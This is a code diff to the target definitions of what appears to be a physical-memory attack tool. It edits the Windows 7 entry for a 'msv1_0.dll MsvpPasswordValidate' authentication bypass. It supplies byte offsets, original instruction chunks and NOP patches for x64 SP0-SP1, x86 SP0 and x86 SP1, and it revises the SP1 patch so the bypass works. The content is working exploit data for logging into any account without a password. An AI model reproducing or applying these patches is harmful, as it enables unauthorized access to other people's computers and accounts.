@@ -121,22 +121,22 @@ targets=[{'OS': 'Windows 7',
           'architectures': ['x32', 'x64'],
           'name': 'msv1_0.dll MsvpPasswordValidate technique',
           'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password.',
-          'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], #x64
+          'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], #x64 SP0-SP1
                           'chunks': [{'chunk': 0xc60f85,
                                       'internaloffset': 0x00,
                                       'patch': 0x909090909090,
                                       'patchoffset': 0x01},
                                      {'chunk': 0xb8,
                                       'internaloffset': 0x07}]},
-                         {'offsets': [0x926], #x86
+                         {'offsets': [0x926], #x86 SP0
                           'chunks': [{'chunk': 0x83f8107513b0018b,
                                       'internaloffset': 0x00,
                                       'patch': 0x83f8109090b0018b,
                                       'patchoffset': 0x00}]},
-                         {'offsets': [0x312], #x86
-                          'chunks': [{'chunk': 0x83f8100f85509400,
+                         {'offsets': [0x312], #x86 SP1
+                          'chunks': [{'chunk': 0x83f8100f8550940000b0018b,
                                       'internaloffset': 0x00,
-                                      'patch': 0x83f8109090509400,
+                                      'patch': 0x83f810909090909090b0018b,
                                       'patchoffset': 0x00}]}]},
          {'OS': 'Windows Vista',
           'versions': ['SP0'],
